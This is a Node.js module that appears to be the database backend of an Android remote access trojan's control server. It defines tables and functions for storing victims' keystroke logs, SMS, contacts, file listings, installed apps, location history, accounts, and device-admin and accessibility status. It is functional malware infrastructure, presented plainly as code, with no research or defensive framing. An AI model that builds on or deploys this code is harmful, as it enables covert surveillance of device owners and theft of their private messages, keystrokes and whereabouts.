'use strict';

const Database = require('better-sqlite3');
const path = require('path');

const DB_PATH = path.join(__dirname, 'rats.db');

let db;

function getDb() {
  if (!db) {
    db = new Database(DB_PATH);
    db.pragma('journal_mode = WAL');
    db.pragma('foreign_keys = ON');
    db.pragma('synchronous = NORMAL');
    initSchema();
  }
  return db;
}

function initSchema() {
  db.exec(`
    CREATE TABLE IF NOT EXISTS devices (
      device_id           TEXT PRIMARY KEY,
      model               TEXT,
      manufacturer        TEXT,
      android_version     TEXT,
      sdk                 INTEGER,
      network_type        TEXT,
      sim_operator        TEXT,
      battery_level       INTEGER,
      is_charging         INTEGER DEFAULT 0,
      admin_active        INTEGER DEFAULT 0,
      accessibility_active INTEGER DEFAULT 0,
      permissions         TEXT DEFAULT '{}',
      accounts            TEXT DEFAULT '[]',
      blocked_packages    TEXT DEFAULT '[]',
      online              INTEGER DEFAULT 0,
      first_seen          INTEGER NOT NULL,
      last_seen           INTEGER NOT NULL
    );

    CREATE TABLE IF NOT EXISTS logs (
      id        INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT NOT NULL,
      type      TEXT NOT NULL,
      data      TEXT NOT NULL,
      ts        INTEGER NOT NULL
    );
    CREATE INDEX IF NOT EXISTS idx_logs_device_ts ON logs(device_id, ts DESC);

    CREATE TABLE IF NOT EXISTS keylogs (
      id        INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT NOT NULL,
      data      TEXT NOT NULL,
      ts        INTEGER NOT NULL
    );
    CREATE INDEX IF NOT EXISTS idx_keylogs_device ON keylogs(device_id);

    CREATE TABLE IF NOT EXISTS sms (
      id        INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT NOT NULL UNIQUE,
      data      TEXT NOT NULL,
      ts        INTEGER NOT NULL
    );

    CREATE TABLE IF NOT EXISTS contacts (
      id        INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT NOT NULL UNIQUE,
      data      TEXT NOT NULL,
      ts        INTEGER NOT NULL
    );

    CREATE TABLE IF NOT EXISTS file_lists (
      id        INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT NOT NULL,
      path      TEXT NOT NULL,
      data      TEXT NOT NULL,
      ts        INTEGER NOT NULL,
      UNIQUE(device_id, path)
    );

    CREATE TABLE IF NOT EXISTS installed_apps (
      id        INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT NOT NULL UNIQUE,
      data      TEXT NOT NULL,
      ts        INTEGER NOT NULL
    );

    CREATE TABLE IF NOT EXISTS location_log (
      id        INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT NOT NULL,
      data      TEXT NOT NULL,
      ts        INTEGER NOT NULL
    );
    CREATE INDEX IF NOT EXISTS idx_location_device ON location_log(device_id, ts DESC);
  `);
}

// ── Device CRUD ────────────────────────────────────────────────────────────────

const stmts = {};

function stmt(name, sql) {
  if (!stmts[name]) stmts[name] = getDb().prepare(sql);
  return stmts[name];
}

function upsertDevice(deviceId, info = {}) {
  const now = Date.now();
  stmt('upsert_device', `
    INSERT INTO devices (device_id, model, manufacturer, android_version, sdk,
      network_type, sim_operator, battery_level, is_charging, admin_active,
      accessibility_active, permissions, accounts, blocked_packages,
      online, first_seen, last_seen)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?)
    ON CONFLICT(device_id) DO UPDATE SET
      model                = excluded.model,
      manufacturer         = excluded.manufacturer,
      android_version      = excluded.android_version,
      sdk                  = excluded.sdk,
      network_type         = excluded.network_type,
      sim_operator         = excluded.sim_operator,
      battery_level        = excluded.battery_level,
      is_charging          = excluded.is_charging,
      admin_active         = excluded.admin_active,
      accessibility_active = excluded.accessibility_active,
      permissions          = excluded.permissions,
      accounts             = excluded.accounts,
      blocked_packages     = excluded.blocked_packages,
      online               = 1,
      last_seen            = excluded.last_seen
  `).run(
    deviceId,
    info.model         || null,
    info.manufacturer  || null,
    info.androidVersion|| null,
    info.sdk           || null,
    info.networkType   || null,
    info.simOperator   || null,
    info.batteryLevel  ?? null,
    info.isCharging    ? 1 : 0,
    info.adminActive   ? 1 : 0,
    info.accessibilityActive ? 1 : 0,
    JSON.stringify(info.permissions   || {}),
    JSON.stringify(info.accounts      || []),
    JSON.stringify(info.blockedPackages || []),
    now, now
  );
}

function updateDeviceInfo(deviceId, info) {
  const now = Date.now();
  const fields = [];
  const values = [];

  const map = {
    model:               'model',
    manufacturer:        'manufacturer',
    androidVersion:      'android_version',
    sdk:                 'sdk',
    networkType:         'network_type',
    simOperator:         'sim_operator',
    batteryLevel:        'battery_level',
    isCharging:          'is_charging',
    adminActive:         'admin_active',
    accessibilityActive: 'accessibility_active',
  };

  for (const [jsKey, col] of Object.entries(map)) {
    if (info[jsKey] !== undefined) {
      fields.push(`${col} = ?`);
      const v = info[jsKey];
      values.push(typeof v === 'boolean' ? (v ? 1 : 0) : v);
    }
  }

  if (info.permissions !== undefined) {
    fields.push('permissions = ?');
    values.push(JSON.stringify(info.permissions));
  }
  if (info.accounts !== undefined) {
    fields.push('accounts = ?');
    values.push(JSON.stringify(info.accounts));
  }
  if (info.blockedPackages !== undefined) {
    fields.push('blocked_packages = ?');
    values.push(JSON.stringify(info.blockedPackages));
  }

  if (fields.length === 0) return;
  fields.push('last_seen = ?');
  values.push(now, deviceId);

  getDb().prepare(`UPDATE devices SET ${fields.join(', ')} WHERE device_id = ?`).run(...values);
}

function setDeviceOnline(deviceId, online) {
  stmt('set_online', `UPDATE devices SET online = ?, last_seen = ? WHERE device_id = ?`)
    .run(online ? 1 : 0, Date.now(), deviceId);
}

function getDevice(deviceId) {
  return stmt('get_device', `SELECT * FROM devices WHERE device_id = ?`).get(deviceId) || null;
}

function getAllDevices() {
  return stmt('all_devices', `SELECT * FROM devices ORDER BY online DESC, last_seen DESC`).all();
}

// ── Logging ────────────────────────────────────────────────────────────────────

function insertLog(deviceId, type, data) {
  stmt('insert_log', `INSERT INTO logs (device_id, type, data, ts) VALUES (?, ?, ?, ?)`)
    .run(deviceId, type, typeof data === 'string' ? data : JSON.stringify(data), Date.now());
}

function getLogs(deviceId, limit = 200) {
  return stmt('get_logs', `SELECT * FROM logs WHERE device_id = ? ORDER BY ts DESC LIMIT ?`)
    .all(deviceId, limit);
}

// ── Keylogs ────────────────────────────────────────────────────────────────────

function insertKeylog(deviceId, data) {
  stmt('insert_keylog', `INSERT INTO keylogs (device_id, data, ts) VALUES (?, ?, ?)`)
    .run(deviceId, data, Date.now());
}

function getKeylogs(deviceId, limit = 500) {
  return stmt('get_keylogs', `SELECT * FROM keylogs WHERE device_id = ? ORDER BY ts DESC LIMIT ?`)
    .all(deviceId, limit);
}

function clearKeylogs(deviceId) {
  stmt('clear_keylogs', `DELETE FROM keylogs WHERE device_id = ?`).run(deviceId);
}

// ── SMS ────────────────────────────────────────────────────────────────────────

function upsertSms(deviceId, data) {
  stmt('upsert_sms', `
    INSERT INTO sms (device_id, data, ts) VALUES (?, ?, ?)
    ON CONFLICT(device_id) DO UPDATE SET data = excluded.data, ts = excluded.ts
  `).run(deviceId, JSON.stringify(data), Date.now());
}

function getSms(deviceId) {
  const row = stmt('get_sms', `SELECT * FROM sms WHERE device_id = ?`).get(deviceId);
  return row ? JSON.parse(row.data) : null;
}

// ── Contacts ───────────────────────────────────────────────────────────────────

function upsertContacts(deviceId, data) {
  stmt('upsert_contacts', `
    INSERT INTO contacts (device_id, data, ts) VALUES (?, ?, ?)
    ON CONFLICT(device_id) DO UPDATE SET data = excluded.data, ts = excluded.ts
  `).run(deviceId, JSON.stringify(data), Date.now());
}

function getContacts(deviceId) {
  const row = stmt('get_contacts', `SELECT * FROM contacts WHERE device_id = ?`).get(deviceId);
  return row ? JSON.parse(row.data) : null;
}

// ── File Lists ─────────────────────────────────────────────────────────────────

function upsertFileList(deviceId, dirPath, data) {
  stmt('upsert_files', `
    INSERT INTO file_lists (device_id, path, data, ts) VALUES (?, ?, ?, ?)
    ON CONFLICT(device_id, path) DO UPDATE SET data = excluded.data, ts = excluded.ts
  `).run(deviceId, dirPath, JSON.stringify(data), Date.now());
}

function getFileList(deviceId, dirPath) {
  const row = stmt('get_files', `SELECT * FROM file_lists WHERE device_id = ? AND path = ?`).get(deviceId, dirPath);
  return row ? JSON.parse(row.data) : null;
}

// ── Installed Apps ─────────────────────────────────────────────────────────────

function upsertApps(deviceId, data) {
  stmt('upsert_apps', `
    INSERT INTO installed_apps (device_id, data, ts) VALUES (?, ?, ?)
    ON CONFLICT(device_id) DO UPDATE SET data = excluded.data, ts = excluded.ts
  `).run(deviceId, JSON.stringify(data), Date.now());
}

function getApps(deviceId) {
  const row = stmt('get_apps', `SELECT * FROM installed_apps WHERE device_id = ?`).get(deviceId);
  return row ? JSON.parse(row.data) : null;
}

// ── Location ───────────────────────────────────────────────────────────────────

function insertLocation(deviceId, data) {
  stmt('insert_location', `INSERT INTO location_log (device_id, data, ts) VALUES (?, ?, ?)`)
    .run(deviceId, JSON.stringify(data), Date.now());
}

function getLatestLocation(deviceId) {
  const row = stmt('get_location', `SELECT * FROM location_log WHERE device_id = ? ORDER BY ts DESC LIMIT 1`).get(deviceId);
  return row ? JSON.parse(row.data) : null;
}

module.exports = {
  getDb,
  upsertDevice,
  updateDeviceInfo,
  setDeviceOnline,
  getDevice,
  getAllDevices,
  insertLog,
  getLogs,
  insertKeylog,
  getKeylogs,
  clearKeylogs,
  upsertSms,
  getSms,
  upsertContacts,
  getContacts,
  upsertFileList,
  getFileList,
  upsertApps,
  getApps,
  insertLocation,
  getLatestLocation,
};
